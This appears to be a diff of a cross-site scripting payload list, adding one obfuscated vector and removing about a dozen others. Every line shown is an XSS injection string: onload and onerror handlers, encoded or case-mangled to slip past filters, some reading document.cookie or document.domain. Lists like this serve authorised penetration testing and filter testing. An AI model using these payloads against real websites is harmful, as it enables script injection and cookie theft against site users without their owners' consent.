@@ -3,18 +3,8 @@ xyz';"/></textarea><Img Src=OnXSS OnError=prompt(document.cookie)>
 "><body/onload="{x:onerror=alert};x"
 10</option></select><img/src=xon=()onx+honerror=alert(1)>ss<svg/onload=prompt(document.domain)%20>
 <script type="text/javascript">javascript:alert(1);</script>
+1<%0A!--%0A><%0ASvg%0COn%0ALoad=(conf%0Airm)(1)--%0A>
 <svg/onload=alert&sol;**&sol;(3)>
 <svg/onload=alert/*1337*/(1)>
 "><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
 "><body/onload="{x:onerror=alert};x"
-”><svg onload=alert&#0000000040"1")>
-page=1"><Svg Only=1 OnLoad=confirm(document.domain)>
-<img/src=xon=()onx+honerror=alert(1)>ss<svg/onload=prompt(document.domain)%20>
-<svg/onload=prompt()>
-"><Svg Only=1 OnLoad=confirm(document.domain)>
-“><img only src=1 onerror=alert()>
-<sVg %00%00%00//onsite ONloAd=\u0061\u006C\u0065\u0072\u0074`/AmoloHT/`//>
-"><body/onload="{x:onerror=alert};x"
-<svg onload=prompt&#0000000040document.domain)>"
-<svg onload=alert&#0000000040"1")>
-<svg/onload=alert//&NewLine;(2)>
